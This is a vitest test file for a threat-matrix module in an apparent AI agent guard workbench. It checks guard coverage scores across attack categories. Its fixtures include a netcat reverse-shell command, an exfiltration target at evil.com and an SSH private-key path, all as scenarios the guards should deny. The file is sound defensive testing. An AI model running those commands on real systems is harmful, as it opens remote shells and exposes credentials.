import { describe, it, expect } from "vitest";
import {
  computeThreatMatrix,
  findScenariosForCell,
  ATTACK_CATEGORIES,
  type AttackCategory,
} from "../threat-matrix-data";
import type { WorkbenchPolicy, GuardId, TestScenario, SimulationResult } from "../types";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makePolicy(guards: WorkbenchPolicy["guards"]): WorkbenchPolicy {
  return {
    version: "1.2.0",
    name: "test",
    description: "",
    guards,
    settings: {},
  };
}

/** Policy with all 13 guards enabled in a reasonable default config. */
function makeFullPolicy(): WorkbenchPolicy {
  return makePolicy({
    forbidden_path: { enabled: true, patterns: ["**/.ssh/**"] },
    path_allowlist: { enabled: true, file_access_allow: ["/app/**"] },
    egress_allowlist: { enabled: true, allow: ["api.github.com"], default_action: "block" },
    secret_leak: {
      enabled: true,
      patterns: [{ name: "aws", pattern: "AKIA", severity: "critical" }],
    },
    patch_integrity: { enabled: true },
    shell_command: { enabled: true },
    mcp_tool: { enabled: true, allow: ["read_file"], default_action: "block" },
    prompt_injection: { enabled: true },
    jailbreak: { enabled: true },
    computer_use: { enabled: true, mode: "guardrail" },
    remote_desktop_side_channel: { enabled: true },
    input_injection_capability: { enabled: true },
    spider_sense: { enabled: true },
  });
}

const ALL_GUARD_IDS: GuardId[] = [
  "forbidden_path",
  "path_allowlist",
  "egress_allowlist",
  "secret_leak",
  "patch_integrity",
  "shell_command",
  "mcp_tool",
  "prompt_injection",
  "jailbreak",
  "computer_use",
  "remote_desktop_side_channel",
  "input_injection_capability",
  "spider_sense",
];

// ---------------------------------------------------------------------------
// ATTACK_CATEGORIES constant
// ---------------------------------------------------------------------------

describe("ATTACK_CATEGORIES", () => {
  it("has exactly 8 attack categories", () => {
    expect(ATTACK_CATEGORIES).toHaveLength(8);
  });

  it("contains all expected category IDs", () => {
    const ids = ATTACK_CATEGORIES.map((c) => c.id);
    expect(ids).toContain("file_exfiltration");
    expect(ids).toContain("network_egress");
    expect(ids).toContain("command_injection");
    expect(ids).toContain("credential_theft");
    expect(ids).toContain("prompt_injection");
    expect(ids).toContain("jailbreak");
    expect(ids).toContain("mcp_abuse");
    expect(ids).toContain("patch_tampering");
  });

  it("all categories have label, shortLabel, and description", () => {
    for (const cat of ATTACK_CATEGORIES) {
      expect(cat.label).toBeTruthy();
      expect(cat.shortLabel).toBeTruthy();
      expect(cat.description).toBeTruthy();
    }
  });
});

// ---------------------------------------------------------------------------
// computeThreatMatrix — default (full) policy
// ---------------------------------------------------------------------------

describe("computeThreatMatrix with full policy", () => {
  const result = computeThreatMatrix(makeFullPolicy());

  it("produces 13 rows (one per guard)", () => {
    expect(result.rows).toHaveLength(13);
  });

  it("each row has 8 cells (one per attack category)", () => {
    for (const row of result.rows) {
      expect(row.cells).toHaveLength(8);
    }
  });

  it("all 8 attack categories are represented in categoryCoverage", () => {
    const keys = Object.keys(result.categoryCoverage);
    expect(keys).toHaveLength(8);
    for (const cat of ATTACK_CATEGORIES) {
      expect(result.categoryCoverage[cat.id]).toBeDefined();
    }
  });

  it("overallScore is between 0 and 100", () => {
    expect(result.overallScore).toBeGreaterThanOrEqual(0);
    expect(result.overallScore).toBeLessThanOrEqual(100);
  });

  it("overallScore is high when all guards are enabled", () => {
    // With all 13 guards enabled, overall should be well above 50
    expect(result.overallScore).toBeGreaterThan(50);
  });

  it("per-category coverage is between 0 and 100", () => {
    for (const cat of ATTACK_CATEGORIES) {
      const score = result.categoryCoverage[cat.id];
      expect(score).toBeGreaterThanOrEqual(0);
      expect(score).toBeLessThanOrEqual(100);
    }
  });

  it("enabled guards have effectiveLevel equal to staticLevel (not 'none')", () => {
    for (const row of result.rows) {
      for (const cell of row.cells) {
        if (cell.guardEnabled && cell.staticLevel !== "na") {
          expect(cell.effectiveLevel).toBe(cell.staticLevel);
        }
      }
    }
  });

  it("guardNames are populated for all rows", () => {
    for (const row of result.rows) {
      expect(row.guardName).toBeTruthy();
    }
  });
});

// ---------------------------------------------------------------------------
// Disabling a guard reduces coverage
// ---------------------------------------------------------------------------

describe("disabling a guard reduces coverage", () => {
  it("disabling egress_allowlist reduces network_egress coverage", () => {
    const fullResult = computeThreatMatrix(makeFullPolicy());
    const fullNetworkCoverage = fullResult.categoryCoverage.network_egress;

    const reduced = makePolicy({
      ...makeFullPolicy().guards,
      egress_allowlist: { enabled: false },
    });
    const reducedResult = computeThreatMatrix(reduced);

    expect(reducedResult.categoryCoverage.network_egress).toBeLessThan(fullNetworkCoverage);
  });

  it("disabling forbidden_path reduces file_exfiltration coverage", () => {
    const fullResult = computeThreatMatrix(makeFullPolicy());
    const fullCoverage = fullResult.categoryCoverage.file_exfiltration;

    const reduced = makePolicy({
      ...makeFullPolicy().guards,
      forbidden_path: { enabled: false },
    });
    const reducedResult = computeThreatMatrix(reduced);

    expect(reducedResult.categoryCoverage.file_exfiltration).toBeLessThan(fullCoverage);
  });

  it("disabling shell_command reduces command_injection coverage", () => {
    const fullResult = computeThreatMatrix(makeFullPolicy());
    const fullCoverage = fullResult.categoryCoverage.command_injection;

    const reduced = makePolicy({
      ...makeFullPolicy().guards,
      shell_command: { enabled: false },
    });
    const reducedResult = computeThreatMatrix(reduced);

    expect(reducedResult.categoryCoverage.command_injection).toBeLessThan(fullCoverage);
  });

  it("disabling jailbreak guard reduces jailbreak coverage", () => {
    const fullResult = computeThreatMatrix(makeFullPolicy());
    const fullCoverage = fullResult.categoryCoverage.jailbreak;

    const reduced = makePolicy({
      ...makeFullPolicy().guards,
      jailbreak: { enabled: false },
    });
    const reducedResult = computeThreatMatrix(reduced);

    expect(reducedResult.categoryCoverage.jailbreak).toBeLessThan(fullCoverage);
  });

  it("disabled guard cells have effectiveLevel 'none' (not staticLevel)", () => {
    const policy = makePolicy({
      forbidden_path: { enabled: false, patterns: ["**/.ssh/**"] },
    });
    const result = computeThreatMatrix(policy);
    const fpRow = result.rows.find((r) => r.guardId === "forbidden_path")!;
    for (const cell of fpRow.cells) {
      if (cell.staticLevel !== "na") {
        expect(cell.effectiveLevel).toBe("none");
      }
    }
  });
});

// ---------------------------------------------------------------------------
// Overall threat score
// ---------------------------------------------------------------------------

describe("overall threat score calculation", () => {
  it("empty policy has a low overall score", () => {
    const result = computeThreatMatrix(makePolicy({}));
    // With no guards enabled, all effective levels are "none"
    // Spider sense has all "partial" but is not enabled either
    expect(result.overallScore).toBeLessThan(20);
  });

  it("overall score is average of category scores", () => {
    const result = computeThreatMatrix(makeFullPolicy());
    const categoryScores = Object.values(result.categoryCoverage);
    const expectedAvg = Math.round(
      categoryScores.reduce((a, b) => a + b, 0) / categoryScores.length,
    );
    expect(result.overallScore).toBe(expectedAvg);
  });
});

// ---------------------------------------------------------------------------
// Critical gap identification
// ---------------------------------------------------------------------------

describe("critical gap identification", () => {
  it("empty policy reports critical gaps", () => {
    const result = computeThreatMatrix(makePolicy({}));
    expect(result.criticalGaps.length).toBeGreaterThan(0);
  });

  it("gaps with coverage < 30% are marked as high severity", () => {
    const result = computeThreatMatrix(makePolicy({}));
    for (const gap of result.criticalGaps) {
      const coverage = result.categoryCoverage[gap.category];
      if (coverage < 30) {
        expect(gap.severity).toBe("high");
      }
    }
  });

  it("gaps have categoryLabel and recommendation", () => {
    const result = computeThreatMatrix(makePolicy({}));
    for (const gap of result.criticalGaps) {
      expect(gap.categoryLabel).toBeTruthy();
      expect(gap.recommendation).toBeTruthy();
      expect(gap.description).toBeTruthy();
    }
  });

  it("full policy has few or no critical gaps", () => {
    const result = computeThreatMatrix(makeFullPolicy());
    // With all guards enabled, most categories should be well-covered
    const highGaps = result.criticalGaps.filter((g) => g.severity === "high");
    expect(highGaps.length).toBe(0);
  });

  it("recommendations mention specific guards when disabled", () => {
    const policy = makePolicy({
      shell_command: { enabled: false },
    });
    const result = computeThreatMatrix(policy);
    const cmdGap = result.criticalGaps.find((g) => g.category === "command_injection");
    if (cmdGap) {
      expect(cmdGap.recommendation.toLowerCase()).toContain("shell command");
    }
  });
});

// ---------------------------------------------------------------------------
// "na" cells are preserved
// ---------------------------------------------------------------------------

describe("na cells", () => {
  it("na cells stay na regardless of guard enablement", () => {
    const result = computeThreatMatrix(makeFullPolicy());
    const patchRow = result.rows.find((r) => r.guardId === "patch_integrity")!;
    // patch_integrity is "na" for everything except patch_tampering
    for (const cell of patchRow.cells) {
      if (cell.attackCategory !== "patch_tampering") {
        expect(cell.staticLevel).toBe("na");
        expect(cell.effectiveLevel).toBe("na");
      }
    }
  });
});

// ---------------------------------------------------------------------------
// findScenariosForCell
// ---------------------------------------------------------------------------

describe("findScenariosForCell", () => {
  const scenarios: TestScenario[] = [
    {
      id: "s1",
      name: "SSH access",
      description: "",
      category: "attack",
      actionType: "file_access",
      payload: { path: "/home/.ssh/id_rsa" },
    },
    {
      id: "s2",
      name: "Normal file read",
      description: "",
      category: "benign",
      actionType: "file_access",
      payload: { path: "/app/main.ts" },
    },
    {
      id: "s3",
      name: "Reverse shell",
      description: "",
      category: "attack",
      actionType: "shell_command",
      payload: { command: "nc -e /bin/sh 10.0.0.1 4444" },
    },
    {
      id: "s4",
      name: "Network exfil",
      description: "",
      category: "attack",
      actionType: "network_egress",
      payload: { host: "evil.com" },
    },
  ];

  const results: SimulationResult[] = [
    {
      scenarioId: "s1",
      overallVerdict: "deny",
      guardResults: [{ guardId: "forbidden_path", guardName: "Forbidden Path", verdict: "deny", message: "blocked" }],
      executedAt: new Date().toISOString(),
    },
    {
      scenarioId: "s3",
      overallVerdict: "deny",
      guardResults: [{ guardId: "shell_command", guardName: "Shell Command", verdict: "deny", message: "blocked" }],
      executedAt: new Date().toISOString(),
    },
    {
      scenarioId: "s4",
      overallVerdict: "deny",
      guardResults: [{ guardId: "egress_allowlist", guardName: "Egress Control", verdict: "deny", message: "blocked" }],
      executedAt: new Date().toISOString(),
    },
  ];

  it("finds file_access attack scenarios for forbidden_path + file_exfiltration", () => {
    const found = findScenariosForCell("forbidden_path", "file_exfiltration", scenarios, results);
    // s1 is file_access + attack + has forbidden_path guard result
    expect(found.length).toBeGreaterThanOrEqual(1);
    expect(found.some((f) => f.scenario.id === "s1")).toBe(true);
  });

  it("excludes benign scenarios", () => {
    const found = findScenariosForCell("forbidden_path", "file_exfiltration", scenarios, results);
    // s2 is benign — should be excluded
    expect(found.some((f) => f.scenario.id === "s2")).toBe(false);
  });

  it("returns empty for unrelated guard + category combinations", () => {
    // patch_integrity has no file_access scenarios
    const found = findScenariosForCell("patch_integrity", "file_exfiltration", scenarios, results);
    expect(found).toHaveLength(0);
  });

  it("matches shell_command scenarios for command_injection", () => {
    const found = findScenariosForCell("shell_command", "command_injection", scenarios, results);
    expect(found.some((f) => f.scenario.id === "s3")).toBe(true);
  });

  it("matches network_egress scenarios for egress_allowlist + network_egress", () => {
    const found = findScenariosForCell("egress_allowlist", "network_egress", scenarios, results);
    expect(found.some((f) => f.scenario.id === "s4")).toBe(true);
  });

  it("includes the simulation result when available", () => {
    const found = findScenariosForCell("forbidden_path", "file_exfiltration", scenarios, results);
    const s1Entry = found.find((f) => f.scenario.id === "s1");
    expect(s1Entry).toBeDefined();
    expect(s1Entry!.result).toBeDefined();
    expect(s1Entry!.result!.overallVerdict).toBe("deny");
  });
});

// ---------------------------------------------------------------------------
// Static coverage mapping completeness
// ---------------------------------------------------------------------------

describe("static coverage mapping completeness", () => {
  it("every guard has a mapping for all 8 attack categories", () => {
    const result = computeThreatMatrix(makeFullPolicy());
    for (const row of result.rows) {
      expect(row.cells).toHaveLength(8);
      const categories = row.cells.map((c) => c.attackCategory);
      for (const cat of ATTACK_CATEGORIES) {
        expect(categories).toContain(cat.id);
      }
    }
  });

  it("spider_sense has partial coverage across all categories", () => {
    const result = computeThreatMatrix(makeFullPolicy());
    const spiderRow = result.rows.find((r) => r.guardId === "spider_sense")!;
    for (const cell of spiderRow.cells) {
      expect(cell.staticLevel).toBe("partial");
    }
  });
});
